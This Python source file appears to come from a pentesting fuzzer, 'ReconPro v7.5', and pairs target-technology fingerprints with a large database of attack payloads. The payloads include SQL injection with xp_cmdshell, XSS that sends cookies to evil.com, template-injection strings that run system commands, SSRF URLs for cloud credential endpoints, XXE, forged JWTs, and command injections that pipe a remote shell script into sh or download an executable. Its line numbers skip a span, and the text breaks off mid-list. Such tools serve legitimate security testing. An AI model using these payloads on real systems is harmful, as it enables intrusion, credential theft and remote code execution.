     1→"""
     2→ReconPro v7.5 — Context-Aware Payload Fuzzing Engine
     3→=====================================================
     4→Selects intelligent payloads based on the target's detected technology stack
     5→instead of blindly testing all payloads against every parameter.
     6→
     7→Zero external dependencies — uses only stdlib (urllib, re, dataclasses, etc.).
     8→"""
     9→
    10→from __future__ import annotations
    11→
    12→import re
    13→import time
    14→import json
    15→import urllib.parse
    16→import urllib.request
    17→import urllib.error
    18→from dataclasses import dataclass, field
    19→from typing import Optional
    20→
    21→
    22→# ──────────────────────────────────────────────────────────────────────────────
    23→# TECH_SIGNATURES — Clues for fingerprinting the target technology stack
    24→# ──────────────────────────────────────────────────────────────────────────────
    25→
    26→TECH_SIGNATURES: dict[str, dict[str, str | list[str]]] = {
    27→    "headers": {
   169→        "bootstrap.min.js": "Bootstrap",
   170→        "svelte": "Svelte",
   171→        "next/dist": "Next.js",
   172→        "_next/static": "Next.js",
   173→        "alpine": "Alpine.js",
   174→        "htmx": "htmx",
   175→        "axios": "Axios",
   176→        "d3.min.js": "D3.js",
   177→        "three": "Three.js",
   178→        "moment.min.js": "Moment.js",
   179→    },
   180→    "file_extensions": {
   181→        ".php": "PHP",
   182→        ".asp": "ASP",
   183→        ".aspx": "ASP.NET",
   184→        ".jsp": "Java",
   185→        ".do": "Java (Struts)",
   186→        ".action": "Java (Struts)",
   187→        ".py": "Python",
   188→        ".rb": "Ruby",
   189→        ".go": "Go",
   190→        ".rs": "Rust",
   191→        ".pl": "Perl",
   192→        ".cgi": "CGI",
   193→        ".cfm": "ColdFusion",
   194→        ".dll": "IIS",
   195→    },
   196→    "waf_signatures": {
   197→        "X-WAF-Event": "WAF",
   198→        "X-Sucuri-ID": "Sucuri WAF",
   199→        "X-CDN": "Imperva Cloud WAF",
   200→        "X-Veracode-HASH": "Veracode WAF",
   201→        "CF-RAY": "Cloudflare WAF",
   202→        "__cfduid": "Cloudflare WAF",
   203→        "X-Akamai-GS": "Akamai WAF",
   204→        "X-DefendID": "DefendID WAF",
   205→        "X-Iinfo": "F5 BIG-IP ASM",
   206→        "X-Applereason": "Apple WAF",
   207→        "NSC": "NetScaler WAF",
   208→        "CitrixNS_ID": "Citrix WAF",
   209→        "X-WAF-Block": "Generic WAF",
   210→        "X-Frame-Options": "Security Headers Present",
   211→    },
   212→}
   213→
   214→
   215→# ──────────────────────────────────────────────────────────────────────────────
   216→# PAYLOAD_DATABASE — Real pentesting payloads organized by category & framework
   217→# ──────────────────────────────────────────────────────────────────────────────
   218→
   219→PAYLOAD_DATABASE: dict[str, dict[str, list[str]]] = {
   220→
   221→    # ── SQL Injection ──────────────────────────────────────────────────────
   222→    "sqli": {
   223→        "mysql": [
   224→            "' OR '1'='1",
   225→            "1' OR '1'='1' -- ",
   226→            "' OR 1=1 -- ",
   227→            "' UNION SELECT NULL, username, password FROM users-- ",
   228→            "' UNION SELECT 1, table_name FROM information_schema.tables-- ",
   229→            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ",
   230→            "' AND BENCHMARK(5000000,SHA1('test'))-- ",
   231→            "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- ",
   232→            "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- ",
   233→            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
   234→        ],
   235→        "postgres": [
   236→            "' OR '1'='1",
   237→            "1' OR '1'='1'--",
   238→            "' UNION SELECT NULL, table_name FROM information_schema.tables--",
   239→            "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--",
   240→            "1; SELECT pg_sleep(5)--",
   241→            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
   242→            "'::int; SELECT 1--",
   243→            "' UNION SELECT NULL, current_database()--",
   244→            "' UNION SELECT NULL, version()--",
   245→            "' UNION SELECT NULL, current_user--",
   246→            "' AND 1=CAST((SELECT version()) AS INT)--",
   247→        ],
   248→        "mssql": [
   249→            "' OR '1'='1",
   250→            "1' OR '1'='1'--",
   251→            "' UNION SELECT NULL, name FROM sysobjects WHERE xtype='U'--",
   252→            "' UNION SELECT NULL, name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--",
   253→            "1; WAITFOR DELAY '0:0:5'--",
   254→            "'; EXEC master..xp_cmdshell('nslookup attacker.com')--",
   255→            "' UNION SELECT NULL, @@version--",
   256→            "' UNION SELECT NULL, DB_NAME()--",
   257→            "' UNION SELECT NULL, SYSTEM_USER--",
   258→            "' AND 1=CONVERT(INT,(SELECT @@version))--",
   259→        ],
   260→        "sqlite": [
   261→            "' OR '1'='1",
   262→            "1' OR '1'='1'--",
   263→            "' UNION SELECT name FROM sqlite_master WHERE type='table'--",
   264→            "' UNION SELECT sql FROM sqlite_master--",
   265→            "' UNION SELECT 1, sqlite_version()--",
   266→            "' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INTEGER)--",
   267→            "1' AND load_extension('libc')--",
   268→            "' UNION SELECT NULL, tbl_name FROM sqlite_master WHERE type='table'--",
   269→            "1' UNION SELECT hex(zeroblob(8192))--",
   270→            "' AND (SELECT count(*) FROM sqlite_master WHERE type='table')>0--",
   271→        ],
   272→        "oracle": [
   273→            "' OR '1'='1",
   274→            "' UNION SELECT NULL, table_name FROM all_tables--",
   275→            "' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS'--",
   276→            "' UNION SELECT NULL, banner FROM v$version--",
   277→            "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5)='a'--",
   278→            "' UNION SELECT NULL, SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual--",
   279→            "' UNION SELECT NULL, user FROM dual--",
   280→            "' AND (SELECT UTL_INADDR.get_host_address FROM dual) IS NOT NULL--",
   281→            "' UNION SELECT NULL, ORA_DATABASE_NAME FROM dual--",
   282→            "' OR 1=1||CHR(59)--",
   283→        ],
   284→        "generic": [
   285→            "' OR '1'='1",
   286→            "1 OR 1=1",
   287→            "' OR 1=1--",
   288→            "' OR '1'='1'/*",
   289→            "1' OR '1'='1' -- -",
   290→            "' UNION SELECT NULL,NULL,NULL--",
   291→            "' UNION SELECT NULL,username,password FROM users--",
   292→            "1; DROP TABLE users--",
   293→            "' AND 1=1--",
   294→            "' AND 1=2--",
   295→            "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
   296→            "' OR ''='",
   297→            "admin'--",
   298→            "1' ORDER BY 1--",
   299→            "1' ORDER BY 9999--",
   300→            "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
   301→            "1' GROUP BY 1--",
   302→            "' AND SUBSTRING(username,1,1)='a'--",
   303→            "1' AND 1=1 UNION SELECT NULL, @@version--",
   304→            "'; EXEC xp_cmdshell('whoami')--",
   305→            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
   306→        ],
   307→    },
   308→
   309→    # ── Cross-Site Scripting (XSS) ─────────────────────────────────────────
   310→    "xss": {
   311→        "html": [
   312→            "<script>alert('XSS')</script>",
   313→            "<img src=x onerror=alert(1)>",
   314→            "<svg onload=alert(1)>",
   315→            "<body onload=alert(1)>",
   316→            "<iframe src=javascript:alert(1)>",
   317→            "<marquee onstart=alert(1)>",
   318→            "<details open ontoggle=alert(1)>",
   319→            '<a href="javascript:alert(1)">click</a>',
   320→            '<input onfocus=alert(1) autofocus>',
   321→            '<div style="background:url(javascript:alert(1))">',
   322→        ],
   323→        "angular": [
   324→            "{{7*7}}",
   325→            "{{constructor.constructor('return alert()')()}}",
   326→            "{{$eval.constructor('return alert()')()}}",
   327→            "{{x='constructor';y=x;alert(y)}}",
   328→            "{{''.constructor.constructor('alert(1)')()}}",
   329→            "{{toString.constructor('return alert()')()}}",
   330→            "{{$on.constructor('alert(1)')()}}",
   331→            "{{[].constructor.constructor('alert(1)')()}}",
   332→            "{{0.constructor.constructor('alert(1)')()}}",
   333→            "{{a=toString;b=a.constructor;b('alert(1)')()}}",
   334→        ],
   335→        "react": [
   336→            "{{}}",
   337→            '{"__proto__":{"isAdmin":1}}',
   338→            '{"constructor":{"prototype":{"isAdmin":true}}}',
   339→            '<script src="https://evil.com/1.js"></script>',
   340→            'javascript:alert(1)',
   341→            '<img src=x onerror="window.location=\'https://evil.com/?c=\'+document.cookie">',
   342→            '<a href="https://evil.com" target="_blank" rel="opener">click</a>',
   343→            '"><img src=x onerror=alert(document.domain)>',
   344→            "'-alert(1)-'",
   345→            "<script>document.body.innerHTML=''</script>",
   346→        ],
   347→        "vue": [
   348→            "{{7*7}}",
   349→            "{{this.constructor.constructor('return this')().alert(1)}}",
   350→            "{{constructor.constructor('return alert(1)')()}}",
   351→            "${7*7}",
   352→            "{{_c.constructor('alert(1)')()}}",
   353→            "{{[].pop.constructor('alert(1)')()}}",
   354→            "{{'a'.constructor.constructor('alert(1)')()}}",
   355→            "{{$data.constructor.constructor('alert(1)')()}}",
   356→            "{{typeof this}}",
   357→            "{{[this][0].constructor.constructor('alert(1)')()}}",
   358→        ],
   359→        "generic": [
   360→            "<script>alert(String.fromCharCode(88,83,83))</script>",
   361→            "<img src=1 onerror=alert(1)>",
   362→            "<svg/onload=alert(1)>",
   363→            "'';!--\"<xss>=&{()}",
   364→            "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
   365→            "<div data-x=\"\"><img src=x onerror=alert(1)//\"></div>",
   366→            "javascript:void(0)//\"",
   367→            "'-alert(1)-'",
   368→            "<img src=x:alert(alt) onerror=eval(src)>",
   369→            "prompt(1)",
   370→        ],
   371→    },
   372→
   373→    # ── Server-Side Template Injection (SSTI) ──────────────────────────────
   374→    "ssti": {
   375→        "jinja2": [
   376→            "{{7*7}}",
   377→            "{{config}}",
   378→            "{{self.__init__.__globals__}}",
   379→            "{{''.__class__.__mro__[1].__subclasses__()}}",
   380→            "{{''.__class__.__mro__[2].__subclasses__()}}",
   381→            "{{cycler.__init__.__globals__.os}}",
   382→            "{{lipsum.__globals__['os'].popen('id').read()}}",
   383→            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
   384→        ],
   385→        "django": [
   386→            "{% debug %}",
   387→            "{{request}}",
   388→            "{% load debug %}",
   389→            "{% debug context %}",
   390→            "{{settings.SECRET_KEY}}",
   391→            "{{settings.DATABASES}}",
   392→            "{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
   393→            "{{user}}",
   394→        ],
   395→        "mako": [
   396→            "${7*7}",
   397→            "${self._modules[context]}}",
   398→            "<%import os%>${os.popen('id').read()}",
   399→            "${__import__('os').popen('id').read()}",
   400→            "<%=7*7%>",
   401→            "${self.__init__.__globals__['os'].popen('id').read()}",
   402→            "${request.environ}",
   403→            "${self.template.module.__builtins__.__import__('os').popen('id').read()}",
   404→        ],
   405→        "twig": [
   406→            "{{7*7}}",
   407→            "{{_self}}",
   408→            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
   409→            "{{['id']|filter('system')}}",
   410→            "{{dump(app)}}",
   411→            "{{app.request.server.all|join(',')}}",
   412→            "{%for x in _context%}{{x}}{%endfor%}",
   413→            "{{_context|json_encode}}",
   414→        ],
   415→        "generic": [
   416→            "{{7*7}}",
   417→            "${7*7}",
   418→            "#{7*7}",
   419→            "<%=7*7%>",
   420→            "${{7*7}}",
   421→            "#{% debug %}",
   422→            "${{config}}",
   423→            "{{7*'7'}}",
   424→            "{{'{{'}}",
   425→            "{{config.items()}}",
   426→        ],
   427→    },
   428→
   429→    # ── Server-Side Request Forgery (SSRF) ─────────────────────────────────
   430→    "ssrf": {
   431→        "aws_metadata": [
   432→            "http://169.254.169.254/latest/meta-data/",
   433→            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
   434→            "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
   435→            "http://169.254.169.254/latest/user-data/",
   436→            "http://169.254.169.254/latest/meta-data/hostname",
   437→            "http://169.254.169.254/latest/meta-data/local-ipv4",
   438→            "http://169.254.169.254/latest/meta-data/placement/availability-zone",
   439→            "http://169.254.169.254/latest/dynamic/instance-identity/document",
   440→        ],
   441→        "gcp_metadata": [
   442→            "http://metadata.google.internal/computeMetadata/v1/",
   443→            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
   444→            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
   445→            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
   446→            "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
   447→            "http://169.254.169.254/computeMetadata/v1/",
   448→            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
   449→            "http://metadata.google.internal/computeMetadata/v1/os-login/users",
   450→        ],
   451→        "azure_metadata": [
   452→            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
   453→            "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
   454→            "http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/privateIpAddress?api-version=2021-02-01",
   455→            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
   456→            "http://169.254.169.254/metadata/loadbalancer?api-version=2021-02-01",
   457→            "http://169.254.169.254/metadata/instance/compute/vmId?api-version=2021-02-01",
   458→            "http://169.254.169.254/metadata/instance/compute/plan?api-version=2021-02-01",
   459→            "http://169.254.169.254/metadata/instance/identity?api-version=2021-02-01",
   460→        ],
   461→        "generic": [
   462→            "http://127.0.0.1/",
   463→            "http://localhost/",
   464→            "http://[::1]/",
   465→            "http://0.0.0.0/",
   466→            "http://127.0.0.1:80/",
   467→            "http://localhost:8080/",
   468→            "http://2130706433/",
   469→            "http://0x7f000001/",
   470→            "http://127.1/",
   471→            "http://127.0.0.1./",
   472→            "http://0177.0.0.1/",
   473→            "http://10.0.0.1/",
   474→            "http://192.168.1.1/",
   475→            "http://172.16.0.1/",
   476→            "http://169.254.169.254/",
   477→            "http://metadata/",
   478→        ],
   479→    },
   480→
   481→    # ── Path Traversal ─────────────────────────────────────────────────────
   482→    "path_traversal": {
   483→        "unix": [
   484→            "../../../etc/passwd",
   485→            "..%2f..%2f..%2fetc%2fpasswd",
   486→            "....//....//....//etc/passwd",
   487→            "/etc/passwd",
   488→            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
   489→            "..../..../..../etc/passwd",
   490→            "/..../..../..../etc/passwd",
   491→            "../../../etc/shadow",
   492→        ],
   493→        "windows": [
   494→            "..\\..\\..\\windows\\system32\\config\\sam",
   495→            "..%5c..%5c..%5cwindows%5cwin.ini",
   496→            "....\\....\\....\\windows\\win.ini",
   497→            "C:\\windows\\system32\\config\\sam",
   498→            "..\\..\\..\\..\\boot.ini",
   499→            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
   500→            "..\\..\\..\\..\\windows\\repair\\sam",
   501→            "..\\..\\..\\..\\inetpub\\wwwroot\\web.config",
   502→        ],
   503→        "generic": [
   504→            "../",
   505→            "../../",
   506→            "../../../",
   507→            "..%2f",
   508→            "%2e%2e/",
   509→            "..%00/",
   510→            "..%252f",
   511→            "..%c0%af",
   512→            "..%ef%bc%8f",
   513→            "..\\",
   514→            "..././..././..././",
   515→            "/.",
   516→            "//",
   517→            "..;/",
   518→            "..%0d%0a/",
   519→            "..\\%0d%0a/",
   520→        ],
   521→    },
   522→
   523→    # ── Command Injection ────────────────────────────────────────────────────
   524→    "command_injection": {
   525→        "unix": [
   526→            "; id",
   527→            "| id",
   528→            "$(id)",
   529→            "`id`",
   530→            "&& id",
   531→            "|| id",
   532→            "\nid",
   533→            "|| whoami",
   534→            "; cat /etc/passwd",
   535→            "| cat /etc/passwd",
   536→            "$(cat /etc/passwd)",
   537→            "`cat /etc/passwd`",
   538→            "; ls -la /",
   539→            "| ping -c 4 127.0.0.1",
   540→            "$(sleep 5)",
   541→            "; curl https://evil.com/shell.sh|sh",
   542→        ],
   543→        "windows": [
   544→            "& whoami",
   545→            "| whoami",
   546→            "%0a whoami",
   547→            "^whoami",
   548→            "&& whoami",
   549→            "|| whoami",
   550→            "& dir C:\\",
   551→            "| dir C:\\",
   552→            "%0d%0a dir C:\\",
   553→            "& net user",
   554→            "& ipconfig /all",
   555→            "& tasklist",
   556→            "& systeminfo",
   557→            "& ping -n 4 127.0.0.1",
   558→            "certutil -urlcache -split -f https://evil.com/payload.exe",
   559→        ],
   560→        "generic": [
   561→            ";",
   562→            "|",
   563→            "&",
   564→            "&&",
   565→            "||",
   566→            "$(",
   567→            "`",
   568→            "\n",
   569→            "\r\n",
   570→            "%0a",
   571→            "%0d%0a",
   572→            "|",
   573→            ";",
   574→            "&",
   575→            "$(sleep 5)&",
   576→            "' sleep 5 '",
   577→        ],
   578→    },
   579→
   580→    # ── LDAP Injection ──────────────────────────────────────────────────────
   581→    "ldap_injection": {
   582→        "generic": [
   583→            "*()(&)",
   584→            "*()|(&",
   585→            "*)(uid=*))(|(uid=*",
   586→            "admin*",
   587→            "admin*)((|(uid=*",
   588→            "*)(uid=*))",
   589→            "*()%",
   590→            "*%00",
   591→            "*)(|(objectclass=*))",
   592→            "(|(cn=*)(objectclass=user))",
   593→            "*)(objectClass=user))(",
   594→            "*)(objectClass=*))(",
   595→            "*)(uid=*",
   596→            "*)(&",
   597→            ")(cn=*)(objectClass=user))",
   598→            "*)(cn=*))%00",
   599→        ],
   600→    },
   601→
   602→    # ── XML External Entity (XXE) ────────────────────────────────────────────
   603→    "xxe": {
   604→        "generic": [
   605→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
   606→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
   607→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
   608→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
   609→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
   610→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><foo>&xxe;</foo>',
   611→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
   612→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>test</foo>',
   613→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/_SMTP%20INJECTION">]><foo>&xxe;</foo>',
   614→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
   615→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
   616→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar://file:///tmp/evil.jar!/evil.txt">]><foo>&xxe;</foo>',
   617→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "netdoc://etc/passwd">]><foo>&xxe;</foo>',
   618→            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><foo>test</foo>',
   619→            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8=">]><foo>&xxe;</foo>',
   620→        ],
   621→    },
   622→
   623→    # ── JWT Bypass ─────────────────────────────────────────────────────────
   624→    "jwt_bypass": {
   625→        "generic": [
   626→            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
   627→            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiJ9.",
   628→            "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsInN1YiI6IjEyMzQ1Njc4OTAifQ.",
   629→            '{"alg":"none","typ":"JWT"}.{"user":"admin"}.',
   630→            '{"alg":"HS256","typ":"JWT"}.{"user":"admin"}.invalid_sig',
   631→            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
   632→            "eyJhbGciOiJITUFDU0hBMjU2IiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
   633→            "eyJhbGciOiJBbm9ueW1vdXMiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyIjoiYWRtaW4ifQ.",
   634→            '{"kid":"../../dev/null","alg":"HS256"}.{"user":"admin"}.',
   635→            '{"kid":"key\";\nRS256;//","alg":"HS256","typ":"JWT"}.{"user":"admin"}.',
   636→            '{"alg":"HS256","kid":"1; SELECT 1--","typ":"JWT"}.{"user":"admin"}.',
   637→            '{"alg":"RS256","jwk":{"kty":"oct","k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},"typ":"JWT"}.{"user":"admin"}.',
   638→            '{"alg":"PS256","jwk":{"kty":"oct","k":"YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY"},"typ":"JWT"}.eyJ1c2VyIjoiYWRtaW4ifQ.',
   639→            '{"typ":"JWT","alg":"HS256","crit":["exp"],"exp":9223372036854775807}.{"user":"admin"}',
   640→            '{"typ":"JWT","alg":"HS256","x5t":"../../etc/passwd"}.eyJ1c2VyIjoiYWRtaW4ifQ.',
   641→            '{"alg":"none","typ":"JWT"}.eyJhZG1pbiI6dHJ1ZX0.',
   642→            "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.",
